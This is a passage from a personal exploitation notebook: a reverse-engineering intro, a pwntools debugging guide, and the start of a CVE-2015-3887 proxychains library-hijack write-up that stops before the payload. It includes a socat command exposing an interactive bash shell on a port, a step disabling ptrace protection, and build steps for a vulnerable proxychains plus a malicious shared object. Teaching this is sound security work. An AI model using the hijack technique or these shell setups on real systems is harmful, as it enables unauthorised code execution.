<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Exploitation Freaks</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><a href="pwnkit.html"><strong aria-hidden="true">2.3.</strong> Deep Into Pwnkit - CVE-2021-4034</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html"><strong aria-hidden="true">2.4.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.5.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.5.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html"><strong aria-hidden="true">2.5.3.</strong> Naughty List</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-minimelfistic.html"><strong aria-hidden="true">2.5.4.</strong> Minimelfistic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.6.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.6.1.</strong> Split</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.7.</strong> NahamCon 2021</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="nahamcon_ret2basic.html"><strong aria-hidden="true">2.7.1.</strong> ret2basic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.8.</strong> DownunderCTF 2020</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="return-to-what.html"><strong aria-hidden="true">2.8.1.</strong> return-to-what</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.9.</strong> Exploit.Education</div></li><li class="chapter-item expanded "><a href="exploit-education_stack-zero_arm.html"><strong aria-hidden="true">2.10.</strong> Stack-Zero (ARM64)</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><a href="license_checker_1.html"><strong aria-hidden="true">3.3.</strong> License Checker 0x01</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> BackdoorCTF 2013</div></li><li class="chapter-item expanded "><a href="binaary50.html"><strong aria-hidden="true">3.5.</strong> Binary 50</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">4.1.</strong> BabyShell Level 1</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">4.1.1.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">4.1.2.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">4.1.3.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html"><strong aria-hidden="true">4.1.4.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">4.1.5.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">4.1.6.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">4.1.7.</strong> BabyReverse Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-10.html"><strong aria-hidden="true">4.1.8.</strong> BabyReverse Level 10</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-13.html"><strong aria-hidden="true">4.1.9.</strong> BabyReverse Level 13</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-15.html"><strong aria-hidden="true">4.1.10.</strong> BabyReverse Level 15</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-2.html"><strong aria-hidden="true">4.1.11.</strong> EmbryoGDB Level 2</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-3.html"><strong aria-hidden="true">4.1.12.</strong> EmbryoGDB Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-4.html"><strong aria-hidden="true">4.1.13.</strong> EmbryoGDB Level 4</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.2.</strong> Flare 8 (2021)</div></li><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">4.3.</strong> credchecker</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="flare-on_known.html"><strong aria-hidden="true">4.3.1.</strong> known</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.</strong> Flare 7 (2020)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="flare-on_garbage.html"><strong aria-hidden="true">4.4.1.</strong> garbage</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">5.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Practical Binary Analysis Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">6.1.</strong> Chapter 1</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-1.html"><strong aria-hidden="true">6.1.1.</strong> The C Compilation Process</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-2.html"><strong aria-hidden="true">6.1.2.</strong> Symbols and Stripped Binaries</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-3.html"><strong aria-hidden="true">6.1.3.</strong> Disassembling a Binary</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> Networking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="mass-wificracking.html"><strong aria-hidden="true">7.1.</strong> Mass Wifi Cracking at Scale</a></li><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">7.2.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">7.3.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">7.4.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">7.5.</strong> RTL88x2bu Fake Access Point</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">8.1.</strong> Windows Cheatsheet</a></li><li class="chapter-item expanded "><a href="wireshark_weaponization.html"><strong aria-hidden="true">8.2.</strong> Wireshark Weaponization</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.</strong> HackTheBox</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb-paper.html"><strong aria-hidden="true">9.1.</strong> Paper</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">10.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="phone-opsec-tips.html"><strong aria-hidden="true">10.1.</strong> Phone Opsec Tips</a></li><li class="chapter-item expanded "><a href="irc.html"><strong aria-hidden="true">10.2.</strong> Join a IRC Server anonymously</a></li><li class="chapter-item expanded "><a href="docker.html"><strong aria-hidden="true">10.3.</strong> Docker Tricks</a></li><li class="chapter-item expanded "><a href="scan_faster.html"><strong aria-hidden="true">10.4.</strong> Quicker Port Scans with Masscan</a></li><li class="chapter-item expanded "><a href="bashfuscator.html"><strong aria-hidden="true">10.5.</strong> Bashfuscator</a></li><li class="chapter-item expanded "><a href="python_socketio.html"><strong aria-hidden="true">10.6.</strong> Python - Working with socket.io</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="binary-exploitation-and-reverse-engineering"><a class="header" href="#binary-exploitation-and-reverse-engineering">Binary Exploitation and Reverse Engineering</a></h1>
<p><strong>First things first, welcome in my gitbook !</strong></p>
<p>I decided to make a mdbook so i can share writeups and exploits i found throughout time more easily online...</p>
<p>Hopefully you will enjoy it as much as i did enjoy making the page :)</p>
<p><strong>Time for Explanations !</strong>  Let's start with what is Reverse Engineering</p>
<h1 id="what-is-reverse-engineering-"><a class="header" href="#what-is-reverse-engineering-">What is Reverse Engineering ?</a></h1>
<p>To get a good definition of what is really Reverse Engineering i wen't on Wikipedia... Yeah i know pretty lame.</p>
<p><strong>Reverse engineering</strong> (also known as backwards engineering or back engineering) is a process or method through the application of which one attempts to <strong>understand through deductive reasoning how a device, process, system, or piece of software accomplishes a task with very little (if any) insight into exactly how it does so.</strong></p>
<p>In our case, we're <strong>Reverse Engineering programs (Binary Executables)</strong>, to do that we're using <strong>Decompilers, Debuggers, Disas, Hex Editors, PE Structure Analysis Tools and many more...</strong> note that you can reverse pretty much anything that has been engineered in the first place.</p>
<p><img src="https://c.tenor.com/K8R7LThju04AAAAC/hack-the-planet.gif" alt="alt" /></p>
<h1 id="why-reverse-engineering"><a class="header" href="#why-reverse-engineering">Why Reverse Engineering</a></h1>
<p>If you're into programming, Reverse Engineering might be one of the most important skills to improve your programming knowledge.</p>
<p>Looking at other people code was always one of the best, if not the best way to learn new programming techniques. Now we all know that C and C++ Programs goes through a big process (Preprocessing, Tokenization, Optimizations, Assembling, Linking,...) that basically change the textual code into a binary executable for the Operating System you want.</p>
<p><img src="https://files.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Mk7MCiXZ7za0yxyehCg%2F-Mk7RfLlphCqkUO3SrCj%2F-Mk7Rv7gIyuteAZiRR4v%2Fimage.png?alt=media&amp;token=a8fa223b-1f37-4781-b07d-f7b42dfb80c1" alt="alt" /></p>
<p>Binary is a LOT more harder to understand and only a few binary ninjas are able to understand it, so unless the program is open-source you will potentially need to disassemble or decompile the binary, this is called Reverse Engineering, we take a compile executable (or binary), and we try to understand the code through either :</p>
<ul>
<li>
<p>Disassembly</p>
<ul>
<li>Disassembly is the act of disassembling an executable or binary into it's assembly representation, the disassembling process can't be 100% perfect and they might be some errors to fixed in the disassembled code.</li>
</ul>
</li>
<li>
<p>Decompiling</p>
<ul>
<li>Decompilation is the act of decompiling, we basically take a compiled binary and we tried to reverse that process to obtain a C / C++ representation of the binary or executable your currently analysing.</li>
</ul>
</li>
</ul>
<p>Knowing how to reverse a program will allow you to take any executable you want and look at what it does and how it truly does it things behind the scene.</p>
<p>Also Reverse Engineering, is useful for Malware Analysis, malwares uses a lot of different Obfuscation techniques, to make your life harder as an analyst, knowing how to counter these techniques and how to Deobfuscate programs will highly help you as a programmer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h1>
<ul>
<li><a href="pwntools-debugging.html#prerequisites">Prerequisites</a></li>
<li><a href="pwntools-debugging.html#launching-a-process-under-gdb">Launching a Process Under GDB</a></li>
<li><a href="pwntools-debugging.html#attaching-to-a-running-process">Attaching to a Running Process</a>
<ul>
<li><a href="pwntools-debugging.html#local-processes">Local Processes</a></li>
<li><a href="pwntools-debugging.html#forking-servers">Forking Servers</a></li>
</ul>
</li>
<li><a href="pwntools-debugging.html#debugging-foreign-architectures">Debugging Foreign Architectures</a></li>
<li><a href="pwntools-debugging.html#troubleshooting">Troubleshooting</a>
<ul>
<li><a href="pwntools-debugging.html#behind-the-scenes">Behind the Scenes</a></li>
<li><a href="pwntools-debugging.html#specifying-a-terminal-window">Specifying a Terminal Window</a></li>
<li><a href="pwntools-debugging.html#environment-variables">Environment Variables</a></li>
<li><a href="pwntools-debugging.html#unable-to-attach-to-processes">Unable to Attach to Processes</a></li>
<li><a href="pwntools-debugging.html#argv0-and-argc==0">argv0 and argc==0</a></li>
</ul>
</li>
</ul>
<p>Pwntools has rich support for using a debugger in your exploit workflow, and debuggers
are very useful when developing exploits when issues with exploits arise.</p>
<p>In addition to the resources here for debugging, you may want to enhance your GDB
experience with one of the following projects:</p>
<ul>
<li><a href="https://pwndbg.re">Pwndbg</a></li>
<li><a href="https://github.com/hugsy/gef">GDB Enhanced Features (GEF)</a></li>
</ul>
<h1 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h1>
<p>You should have both <code>gdb</code> and <code>gdbserver</code> installed on your machine.
You can check this easily with <code>which gdb</code> or <code>which gdbserver</code>.</p>
<p>If you find that you don't have them installed, they can easily be installed from
most package managers.</p>
<pre><code class="language-sh">$ sudo apt-get install gdb gdbserver
</code></pre>
<h1 id="launching-a-process-under-gdb"><a class="header" href="#launching-a-process-under-gdb">Launching a Process Under GDB</a></h1>
<p>Launching a process under GDB while still being able to interact with that process
from pwntools is a tricky process, but luckily it's all been sorted out and the 
process is pretty seamless.</p>
<p>To launch a process under GDB from the very first instruction, just use 
<a href="https://docs.pwntools.com/en/stable/gdb.html#pwnlib.gdb.debug">gdb.debug</a>.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(&quot;/bin/bash&quot;, gdbscript='continue')
&gt;&gt;&gt; io.sendline('echo hello')
&gt;&gt;&gt; io.recvline()
# b'hello\n'
&gt;&gt;&gt; io.interactive()
</code></pre>
<p>This should automatically launch the debugger in a new window for you to interact
with.  If it does not, or you see an error about <code>context.terminal</code>, check out the
section on <a href="pwntools-debugging.html#specifying-a-terminal-window">Specifying a Terminal Window</a>.</p>
<p>In this example, we passed in <code>gdbscript='continue'</code> in order for the debugger
to resume execution, but you can pass in any valid GDB script commands and they
will be executed when the debugged process starts.</p>
<h1 id="attaching-to-a-running-process"><a class="header" href="#attaching-to-a-running-process">Attaching to a Running Process</a></h1>
<p>Sometimes you don't want to start your target under a debugger, but want to attach
to it at a certain stage in the exploitation process.<br />
This is also handled seamlessly by Pwntools.</p>
<h2 id="local-processes"><a class="header" href="#local-processes">Local Processes</a></h2>
<p>Generally, you will have created a <code>process()</code> tube in order to interact with the
target executable.  You can simply pass that to <code>gdb.attach()</code> and it will magically
open a new terminal window with the target binary under the debugger.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = process('/bin/sh')
&gt;&gt;&gt; gdb.attach(io, gdbscript='continue')
</code></pre>
<p>A new window should appear, and you can continue to interact with the process
as you normally would from Pwntools.</p>
<h2 id="forking-servers"><a class="header" href="#forking-servers">Forking Servers</a></h2>
<p>Sometimes the binary you want to debug has a forking server, and you want to
debug the process you are connected to (rather than the server itself).  This
is also done seamlessly, as long as the server is running on the current machine.</p>
<p>Let's fake a server with socat!</p>
<pre><code class="language-py">&gt;&gt;&gt; socat = process(['socat', 'TCP-LISTEN:4141,reuseaddr,fork', 'EXEC:/bin/bash -i'])
</code></pre>
<p>Then we connect to the remote process with a <code>remote</code> tube as usual.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = remote('localhost', 4141)
[x] Opening connection to localhost on port 4141
[x] Opening connection to localhost on port 4141: Trying 127.0.0.1
[+] Opening connection to localhost on port 4141: Done
&gt;&gt;&gt; io.sendline('echo hello')
&gt;&gt;&gt; io.recvline()
b'hello\n'
&gt;&gt;&gt; io.lport, io.rport
</code></pre>
<p>It works!  In order to debug the specific <code>bash</code> process our <code>remote</code> object, just
pass it to <code>gdb.attach()</code>.  Pwntools will look up the PID of the remote end of the 
connection and attempt to connect to it automatically.</p>
<pre><code class="language-py">&gt;&gt;&gt; gdb.attach(io)
</code></pre>
<p>A debugger should appear automatically, and you can interact with the process.</p>
<!-- TODO: This is currently broken, see https://github.com/Gallopsled/pwntools/issues/1589 -->
<h1 id="debugging-foreign-architectures"><a class="header" href="#debugging-foreign-architectures">Debugging Foreign Architectures</a></h1>
<p>Debugging foreign architectures (like ARM or PowerPC) from an Intel-based system is
as easy as running them under pwntools.</p>
<pre><code class="language-py">&gt;&gt;&gt; context.arch = 'arm'
&gt;&gt;&gt; elf = ELF.from_assembly(shellcraft.echo(&quot;Hello, world!\n&quot;) + shellcraft.exit())
&gt;&gt;&gt; process(elf.path).recvall()
b'Hello, world!\n'
</code></pre>
<p>Instead of invoking <code>process(...)</code> just use <code>gdb.debug(...)</code>.</p>
<pre><code class="language-py">&gt;&gt;&gt; gdb.debug(elf.path).recvall()
b'Hello, world!\n'
</code></pre>
<h2 id="tips-and-limitations"><a class="header" href="#tips-and-limitations">Tips and Limitations</a></h2>
<p>Processes running foreign architectures MUST be started with <code>gdb.debug</code> in order
to debug them, it is not possible to attach to a running process due to the way
that QEMU works.</p>
<p>It should be noted that QEMU has a very limited GDB stub, which is used to
inform GDB where various libraries are, so debugging may be more difficult,
and some commands will not work.</p>
<p>Pwntools recommends Pwndbg to handle this situation, since it has code specifically
to handle debugging under a QEMU stub.</p>
<!-- TODO: There is no tutorial for interacting with cross-arch binaries -->
<h1 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h1>
<h2 id="behind-the-scenes"><a class="header" href="#behind-the-scenes">Behind the Scenes</a></h2>
<p>Sometimes things just don't work, and you need to see what is happening internal
to Pwntools with the debugger setup.</p>
<p>You can set the logging context globally (via e.g. <code>context.log_level='debug'</code>)
or you can set it ONLY for the GDB session, via passing in the same argument.</p>
<p>You should see everything that's being handled for you behind the scenes.
For example:</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug('/bin/sh', log_level='debug')
[x] Starting local process '/home/user/bin/gdbserver' argv=[b'/home/user/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'/bin/sh']
[+] Starting local process '/home/user/bin/gdbserver' argv=[b'/home/user/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'/bin/sh'] : pid 34282
[DEBUG] Received 0x25 bytes:
    b'Process /bin/sh created; pid = 34286\n'
[DEBUG] Received 0x18 bytes:
    b'Listening on port 45145\n'
[DEBUG] Wrote gdb script to '/tmp/user/pwnxcd1zbyx.gdb'
    target remote 127.0.0.1:45145
[*] running in new terminal: /usr/bin/gdb -q  &quot;/bin/sh&quot; -x /tmp/user/pwnxcd1zbyx.gdb
[DEBUG] Launching a new terminal: ['/usr/local/bin/tmux', 'splitw', '/usr/bin/gdb -q  &quot;/bin/sh&quot; -x /tmp/user/pwnxcd1zbyx.gdb']
[DEBUG] Received 0x25 bytes:
    b'Remote debugging from host 127.0.0.1\n'
</code></pre>
<h2 id="specifying-a-terminal-window"><a class="header" href="#specifying-a-terminal-window">Specifying a Terminal Window</a></h2>
<p>Pwntools [attempts to launch a new window][run_in_new_terminal] to container your 
debugger based on whatever windowing system you are currently using.</p>
<p>By default, it auto-detects:</p>
<ul>
<li>tmux or screen</li>
<li>X11-based terminals like GNOME Terminal</li>
</ul>
<p>If you are not using a supported terminal environment, or it does not work in the
way you want (e.g. horizontal vs vertical splits) you can add support by setting
the <code>context.terminal</code> environment variable.</p>
<p>For example, the following will use TMUX to split horizontally instead of the default.</p>
<pre><code class="language-py">&gt;&gt;&gt; context.terminal = ['tmux', 'splitw', '-h']
</code></pre>
<p>Maybe you're a GNOME Terminal user and the default settings aren't working?</p>
<pre><code class="language-py">&gt;&gt;&gt; context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
</code></pre>
<p>You can specify any terminal you like, and can even put the setting inside
<code>~/.pwn.conf</code> so that it's used for all of you scripts!</p>
<pre><code>[context]
terminal=['x-terminal-emulator', '-e']
</code></pre>
<h2 id="environment-variables"><a class="header" href="#environment-variables">Environment Variables</a></h2>
<p>Pwntools allows you to specify any environment variables you like via <code>process()</code>,
and the same is true for <code>gdb.debug()</code>.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(['bash', '-c', 'echo $HELLO'], env={'HELLO': 'WORLD'})
&gt;&gt;&gt; io.recvline()
b'WORLD\n'
</code></pre>
<h3 id="cwd-and"><a class="header" href="#cwd-and"><code>CWD</code> and <code>   </code></a></h3>
<p>Unfortunately, when using <code>gdb.debug()</code>, the process is launched under <code>gdbserver</code>
which adds its own environment variables.  This may introduce complications when
the environment must be very carefully controlled.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(['env'], env={'FOO':'BAR'}, gdbscript='continue')
&gt;&gt;&gt; print(io.recvallS())
   =/home/user/bin/gdbserver
FOO=BAR

Child exited with status 0
GDBserver exiting
</code></pre>
<p>This only occurs when you launch the process under a debugger with <code>gdb.debug()</code>.
If you're able to start your process and <em>then</em> attach with <code>gdb.attach()</code>, you
can avoid this issue.</p>
<h3 id="environment-variable-ordering"><a class="header" href="#environment-variable-ordering">Environment Variable Ordering</a></h3>
<p>Some exploits may require that certain environment variables are in a specific
order.  Python2 dictionaries are not ordered, which may exacerbate this issue.</p>
<p>In order to have your environment variables in a specific order, we recommend
using Python3 (which orders dictionaries based on insertion order), or using
<code>collections.OrderedDict</code>.</p>
<h2 id="unable-to-attach-to-processes"><a class="header" href="#unable-to-attach-to-processes">Unable to Attach to Processes</a></h2>
<p>Modern Linux systems have a setting called <code>ptrace_scope</code> which prevents processes
that are not child processes from being debugged.  Pwntools works around this
for any processes that it launches itself, but if you have to launch a process
outside of Pwntools and try to attach to it by pid (e.g. <code>gdb.attach(1234)</code>),
you may be prevented from attaching.</p>
<p>You can resolve this by disabling the security setting and rebooting your machine:</p>
<pre><code class="language-sh">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF
kernel.yama.ptrace_scope = 0
EOF
</code></pre>
<h2 id="argv0-and-argc0"><a class="header" href="#argv0-and-argc0">argv0 and argc==0</a></h2>
<p>Some challenges require that they are launched with <code>argv[0]</code> set to a specific
value, or even that it's NULL (i.e. <code>argc==0</code>).</p>
<p>It is not possible to launch a processs with this configuration via <code>gdb.debug()</code>,
but you can use <code>gdb.attach()</code>.  This is because of limitations of launching
binaries under gdbserver.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cve-2015-3887"><a class="header" href="#cve-2015-3887">CVE-2015-3887</a></h1>
<p>CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.</p>
<p>After looking for a bit, i saw a <code>#define SUPER_SECURE</code> with a comment next to it saying &quot;<strong>CVE-2015-3887</strong>&quot;, so i decided to look, and it seemed like a pretty cool exploit to me.</p>
<h2 id="explanations"><a class="header" href="#explanations">Explanations</a></h2>
<p>The exploit is fairly simple and straight forward, the program looks for <code>libproxychains4.so</code> in the <strong>Current Path</strong> of the program instead of looking in the default <strong>libproxychains4.so</strong> directory which is in <strong>/usr/local/lib/libproxychains4.so</strong>...</p>
<p>This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called <strong>payload.c</strong> into a <strong>libproxychains4.so</strong> :</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<p>Next we would need to put the compiled file into the same directory where the <strong>proxychains</strong> binary is being ran from (<code>which proxychains</code> or <code>which proxychains4</code>).</p>
<h2 id="exploit-demo"><a class="header" href="#exploit-demo">Exploit demo</a></h2>
<ol>
<li>Compile the program <strong>with the ignore_cve flag on</strong>, so the program is vulnerable.</li>
</ol>
<pre><code class="language-bash">$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer)

# find the &quot;ignore_cve&quot; field, and change it to &quot;yes&quot; (without quote marks), save and close the editor.

$ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/.        

# These 2 last commands will change every &quot;$(prefix)&quot; and &quot;$(exec_prefix)&quot; with &quot;.&quot;, since we only want to build proxychains in our current directory.

$ ./configure
$ make &amp;&amp; make install

# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
</code></pre>
<ol start="2">
<li>Write and Compile the exploit</li>
